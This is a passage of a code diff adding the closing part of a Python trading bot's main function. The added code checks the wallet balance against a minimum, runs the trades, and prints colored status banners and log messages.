+            print(f"{Fore.YELLOW}💰 Required Balance: {Fore.GREEN}${MIN_BALANCE_USD:.2f} USD{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}📉 Shortage:         {Fore.RED}${MIN_BALANCE_USD - total_balance_usd:.2f} USD{Style.RESET_ALL}")
+            print(f"\n{Fore.RED}❌ Insufficient balance to execute trades.{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}   Please add more funds to your wallet.{Style.RESET_ALL}")
+            print(f"\n{Fore.CYAN}═══════════════════════════════════════════════════════════════════════════{Style.RESET_ALL}\n")
+            logger.error(f"Trading blocked: Insufficient balance (${total_balance_usd:.2f} < ${MIN_BALANCE_USD:.2f})")
+            sys.exit(0)
+        
+        print(f"\n{Fore.GREEN}✅ Balance sufficient: ${total_balance_usd:.2f} >= ${MIN_BALANCE_USD:.2f}{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}✅ All checks passed - Ready to trade!{Style.RESET_ALL}")
+        
+        # Execute trading
+        execute_trading(total_balance_usd)
+        
+        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}║                ✅ BOT EXECUTION COMPLETED ✅                              ║{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}╚═══════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
+        logger.info("Bot execution completed successfully")
+        
+    except KeyboardInterrupt:
+        print(f"\n\n{Fore.YELLOW}⚠ Bot execution interrupted by user{Style.RESET_ALL}")
+        logger.warning("Bot execution interrupted by user")
+        sys.exit(0)
+        
+    except Exception as e:
+        logger.error(f"Unexpected error in main execution: {str(e)}")
+        import traceback
+        logger.error(traceback.format_exc())
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
